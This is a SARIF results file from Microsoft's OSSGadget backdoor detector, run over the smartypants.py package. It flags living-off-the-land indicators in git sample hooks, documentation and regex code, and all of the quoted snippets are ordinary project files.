{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/docs/history.rst"
                },
                "region": {
                  "startLine": 58,
                  "endLine": 59,
                  "endColumn": 3,
                  "snippet": {
                    "text": "\n.. _Yu-Jie Lin: http://yjl.im/\n.. _Leo Hemsted: https://github.com/leohemsted\n\nAt this point, smartpants is heading towards as a *fork* of SmartyPants. The\n\".py\" part is dropped from the project name, \".py\" or \"port\" sometimes is still\nused. For instance, to avoid confused with SmartyPants.\n\n",
                    "rendered": {
                      "text": "\n.. _Yu-Jie Lin: http://yjl.im/\n.. _Leo Hemsted: https://github.com/leohemsted\n\nAt this point, smartpants is heading towards as a *fork* of SmartyPants. The\n\".py\" part is dropped from the project name, \".py\" or \"port\" sometimes is still\nused. For instance, to avoid confused with SmartyPants.\n\n",
                      "markdown": "`\n.. _Yu-Jie Lin: http://yjl.im/\n.. _Leo Hemsted: https://github.com/leohemsted\n\nAt this point, smartpants is heading towards as a *fork* of SmartyPants. The\n\".py\" part is dropped from the project name, \".py\" or \"port\" sometimes is still\nused. For instance, to avoid confused with SmartyPants.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 45,
                  "endLine": 13,
                  "endColumn": 53,
                  "snippet": {
                    "text": "#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n",
                    "rendered": {
                      "text": "#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n",
                      "markdown": "`#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 51,
                  "endLine": 12,
                  "endColumn": 59,
                  "snippet": {
                    "text": "# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n",
                    "rendered": {
                      "text": "# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n",
                      "markdown": "`# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 53,
                  "endLine": 11,
                  "endColumn": 61,
                  "snippet": {
                    "text": "# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n",
                    "rendered": {
                      "text": "# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n",
                      "markdown": "`# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 15,
                  "endLine": 143,
                  "endColumn": 20,
                  "snippet": {
                    "text": "\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n",
                    "rendered": {
                      "text": "\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n",
                      "markdown": "`\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 141,
                  "startColumn": 49,
                  "endLine": 141,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n",
                    "rendered": {
                      "text": "\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n",
                      "markdown": "`\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 129,
                  "startColumn": 30,
                  "endLine": 129,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n",
                    "rendered": {
                      "text": "\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n",
                      "markdown": "`\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 128,
                  "startColumn": 28,
                  "endLine": 128,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n",
                    "rendered": {
                      "text": "\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n",
                      "markdown": "`\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 30,
                  "endLine": 110,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n",
                    "rendered": {
                      "text": "\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n",
                      "markdown": "`\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 45,
                  "endLine": 8,
                  "endColumn": 50,
                  "snippet": {
                    "text": "use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n",
                    "rendered": {
                      "text": "use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n",
                      "markdown": "`use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 17,
                  "endLine": 7,
                  "endColumn": 25,
                  "snippet": {
                    "text": "use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n",
                    "rendered": {
                      "text": "use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n",
                      "markdown": "`use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 1,
                  "endLine": 38,
                  "endColumn": 6,
                  "snippet": {
                    "text": "# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n",
                    "rendered": {
                      "text": "# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n",
                      "markdown": "`# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 37,
                  "endLine": 37,
                  "endColumn": 42,
                  "snippet": {
                    "text": "#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n",
                    "rendered": {
                      "text": "#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n",
                      "markdown": "`#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 25,
                  "endLine": 32,
                  "endColumn": 31,
                  "snippet": {
                    "text": "# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n",
                    "rendered": {
                      "text": "# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n",
                      "markdown": "`# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 40,
                  "endLine": 15,
                  "endColumn": 46,
                  "snippet": {
                    "text": "# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n",
                    "rendered": {
                      "text": "# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n",
                      "markdown": "`# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/post-update.sample"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 4,
                  "endLine": 8,
                  "endColumn": 9,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/post-update.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/smartypants.py"
                },
                "region": {
                  "startLine": 310,
                  "startColumn": 29,
                  "endLine": 310,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    punct_class = r\"\"\"[!\"#\\$\\%'()*+,-.\\/:;<=>?\\@\\[\\\\\\]\\^_`{|}~]\"\"\"\n\n    # Special case if the very first character is a quote\n    # followed by punctuation at a non-word-break. Close the quotes by brute\n    # force:\n    text = re.sub(r\"\"\"^'(?=%s\\\\B)\"\"\" % (punct_class,), '&#8217;', text)\n    text = re.sub(r\"\"\"^\"(?=%s\\\\B)\"\"\" % (punct_class,), '&#8221;', text)\n",
                    "rendered": {
                      "text": "    punct_class = r\"\"\"[!\"#\\$\\%'()*+,-.\\/:;<=>?\\@\\[\\\\\\]\\^_`{|}~]\"\"\"\n\n    # Special case if the very first character is a quote\n    # followed by punctuation at a non-word-break. Close the quotes by brute\n    # force:\n    text = re.sub(r\"\"\"^'(?=%s\\\\B)\"\"\" % (punct_class,), '&#8217;', text)\n    text = re.sub(r\"\"\"^\"(?=%s\\\\B)\"\"\" % (punct_class,), '&#8221;', text)\n",
                      "markdown": "`    punct_class = r\"\"\"[!\"#\\$\\%'()*+,-.\\/:;<=>?\\@\\[\\\\\\]\\^_`{|}~]\"\"\"\n\n    # Special case if the very first character is a quote\n    # followed by punctuation at a non-word-break. Close the quotes by brute\n    # force:\n    text = re.sub(r\"\"\"^'(?=%s\\\\B)\"\"\" % (punct_class,), '&#8217;', text)\n    text = re.sub(r\"\"\"^\"(?=%s\\\\B)\"\"\" % (punct_class,), '&#8221;', text)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/smartypants.py"
                },
                "region": {
                  "startLine": 460,
                  "startColumn": 65,
                  "endLine": 460,
                  "endColumn": 71,
                  "snippet": {
                    "text": "      :func:`convert_dashes_oldschool`, it's compatible with existing entries\n      written before SmartyPants 1.1, back when ``--`` was only used for\n      em-dashes.\n    * Second, em-dashes are more common than en-dashes, and so it sort of\n      makes sense that the shortcut should be shorter to type. (Thanks to Aaron\n      Swartz for the idea.)\n\n",
                    "rendered": {
                      "text": "      :func:`convert_dashes_oldschool`, it's compatible with existing entries\n      written before SmartyPants 1.1, back when ``--`` was only used for\n      em-dashes.\n    * Second, em-dashes are more common than en-dashes, and so it sort of\n      makes sense that the shortcut should be shorter to type. (Thanks to Aaron\n      Swartz for the idea.)\n\n",
                      "markdown": "`      :func:`convert_dashes_oldschool`, it's compatible with existing entries\n      written before SmartyPants 1.1, back when ``--`` was only used for\n      em-dashes.\n    * Second, em-dashes are more common than en-dashes, and so it sort of\n      makes sense that the shortcut should be shorter to type. (Thanks to Aaron\n      Swartz for the idea.)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/smartypants.py"
                },
                "region": {
                  "startLine": 364,
                  "startColumn": 39,
                  "endLine": 364,
                  "endColumn": 45,
                  "snippet": {
